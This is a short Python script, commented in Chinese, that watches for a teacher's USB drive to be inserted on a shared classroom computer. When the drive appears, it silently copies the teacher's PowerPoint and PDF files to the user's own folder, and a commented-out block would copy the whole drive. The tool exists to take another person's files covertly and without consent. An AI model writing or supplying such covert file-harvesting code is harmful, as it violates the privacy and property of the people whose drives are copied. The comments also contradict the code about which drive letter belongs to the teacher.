import os
import shutil
from time import sleep
import tkinter

#程序启动提示
root = tkinter.Tk()
root.minsize(300,300)
root.title("已启动")
root.mainloop()

# 假设目标电脑有两个盘，我的U盘先插进去为E，则老师的U盘后插进去为F
#D盘不会清空，重启后会保留，老师的为E，暂存为多媒体D盘

# 要复制的目录，老师的U盘
file_path = r'E:/'
# 指定保存目录，我的U盘
save_path = r'D:/knowledge/'
# 指定文件格式
format_name = ['.ppt','pptx','pdf']


# 判断文件夹是否存在,不存在创建
def create_folder(folder_name):
    folder_name = folder_name.replace('\\', '/')
    folder_name = folder_name.replace(file_path, save_path)
    if os.path.exists(folder_name):
        return
    folder_list = folder_name.split('/')
    index = 2
    for item in folder_list:
        path = '/'.join(folder_list[0:index])
        if not os.path.exists(path):
            print('不存在目录:' + path + ',对其进行创建')
            os.mkdir(path)
        index += 1

# 复制文件夹下指定文件格式的文件(保留文件夹格式)
def copy_file(format_name):
    for root, dirs, files in os.walk(file_path):
        for file_name in files:
            if file_name.endswith(format_name):
                create_folder(root)
                new_file_path = root.replace('\\', '/').replace(file_path, save_path)
                shutil.copyfile(os.path.join(root, file_name), os.path.join(new_file_path, file_name))
                print(file_name + '复制成功')

'''
# 不管不顾，运行此段，直接复制所有文件
while (True): 
    if os. path.exists(file_path):
        shutil.copytree(file_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d %H%M%S")))
        break
    else:
        time.sleep(10)
'''

if __name__ == '__main__':

    while True:
        # 判断老师U盘是否插入，
        if os. path.exists(file_path):
            
            sleep(10)#如果插入，暂停10秒再判断一次，防止老师U盘没插牢
            if os. path.exists(file_path):
                # 两次判断插入后，开始复制指定格式文件
                for i in format_name:
                    copy_file(i)
                break   # 复制完后终止程序

        else:
            sleep(5)    # 未插入U盘，一直运行，每10秒检测一次